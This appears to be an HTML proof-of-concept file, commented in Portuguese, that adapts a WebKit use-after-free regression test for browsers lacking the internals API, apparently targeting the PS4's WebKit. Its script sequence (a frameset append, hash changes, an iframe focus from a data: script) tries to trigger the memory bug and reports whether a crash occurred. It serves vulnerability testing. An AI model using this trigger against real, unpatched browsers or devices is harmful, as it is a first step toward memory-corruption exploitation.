<!DOCTYPE html>
<!--
  Adaptação do teste render-tree-as-text-uaf.html para browser sem internals API
  AVISO: Sem internals.settings.setCaretBrowsingEnabled(true), o code path
  exato do UAF pode não ser atingido. Um crash indica vulnerabilidade presente.
  Ausência de crash NÃO garante que o fix foi aplicado — o trigger pode
  simplesmente não ter funcionado.
-->
<style>
  iframe {
    content: url();
    zoom: 0.01;
  }
</style>
<div id="status">Executando...</div>
<script>
  onload = () => {
    // internals.settings.setAsyncFrameScrollingEnabled(true) — sem equivalente público
    // internals.settings.setCaretBrowsingEnabled(true) — sem equivalente público
    // Sem essas flags, o code path do UAF pode não ser alcançado.

    document.documentElement.append(document.createElement('frameset'));

    const i0 = document.getElementById('i0');

    i0.onfocus = () => {
      location.hash = 'y';
    };

    location.hash = 'x';

    const s0 = document.createElement('script');

    // Cache API pode não existir em WebKit antigo do PS4
    if (window.caches) {
      s0.src = `data:text/javascript,caches.has('a').then(() => document.getElementById('i0').focus());`;
    } else {
      // Fallback: tenta acionar o foco de forma assíncrona via microtask/macrotask
      s0.src = `data:text/javascript,Promise.resolve().then(() => document.getElementById('i0').focus());`;
    }

    document.head.append(s0);

    // Indicador de sobrevivência — só chega aqui se não houve crash
    setTimeout(() => {
      document.getElementById('status').textContent =
        'Concluído sem crash detectado nesta janela. ' +
        'Nota: ausência de crash pode indicar que o code path não foi atingido.';
    }, 3000);
  };
</script>
<iframe id="i0"></iframe>
